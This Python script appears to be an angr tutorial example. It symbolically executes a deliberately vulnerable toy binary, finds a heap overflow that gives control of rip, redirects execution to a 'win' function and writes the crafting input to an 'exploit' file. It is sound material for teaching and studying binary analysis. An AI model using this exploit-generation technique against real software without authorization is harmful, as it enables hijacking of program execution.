#!/usr/bin/env python

import os, os.path
import subprocess

DIR = os.path.dirname(os.path.realpath(__file__))

def main():
    # angr now has the ability to correctly execute through malloc. this is a big
    # achievement as malloc is a complicated function and shows off how much effort
    # has been placed into creating correct execution. In this example, we will use
    # angr to perform a basic heap overwrite and achieve control over rip.

    # The premise of this binary is to ask for two inputs, the second of which can
    # overflow into the area of the first. Further, a pointer will be dereferenced
    # in this process, thus giving us a target to control execution from.

    # Please note that this example is very dependent on the LIBC version, make
    # sure that you have 'libc.so.6' and 'ld-linux-x86_64.so.2' in the same
    # directory as this script.
    import angr

    # By default, angr will use a sim procedure instead of going through malloc
    # This will tell angr to go ahead and use libc's calloc
    proj = angr.Project("./simple_heap_overflow", exclude_sim_procedures_list=["calloc"])

    # The extra option here is due to a feature not yet in angr for handling
    # underconstraining 0 initialization of certain memory allocations
    state = proj.factory.entry_state(add_options={angr.options.CGC_ZERO_FILL_UNCONSTRAINED_MEMORY,
                                                  angr.options.CONSTRAINT_TRACKING_IN_SOLVER })

    # We're looking for unconstrained paths, it means we may have control
    sm = proj.factory.simulation_manager(state,save_unconstrained=True)

    # Step execution until we find a place we may control
    while sm.active and not sm.unconstrained:
        sm.step()

    print sm
    # In [9]: sm
    # Out[9]: <PathGroup with 1 deadended, 1 unconstrained>

    # Make a copy of the state to play with
    s = sm.unconstrained[0].copy()

    # Now we can simply tell angr to set the instruction pointer to point at the
    # win function to give us execution
    s.add_constraints(s.regs.rip == proj.loader.find_symbol('win').addr)

    print s.solver.constraints
    assert s.satisfiable()

    # Call the solving engine and write the solution out to a file called "exploit"
    print "Writing exploit as \"exploit\""
    s.posix.dump(0,"exploit")

    # Now you can run the program and feed it your exploit to gain execution
    # ./simple_heap_overflow < exploit

def test():

    # Generate the exploit
    main()

    # Make sure it worked
    out = subprocess.check_output("{0} < {1}".format(
        os.path.join(DIR,"simple_heap_overflow"),
        os.path.join(DIR,"exploit"),
        )
        ,shell=True)

    # Assert we got to the printing of Win
    assert "Win" in out


if __name__ == '__main__':
    main()

    out = subprocess.check_output("{0} < {1}".format(
        os.path.join(DIR,"simple_heap_overflow"),
        os.path.join(DIR,"exploit"),
        )
        ,shell=True)

    # Assert we got to the printing of Win
    assert "Win" in out
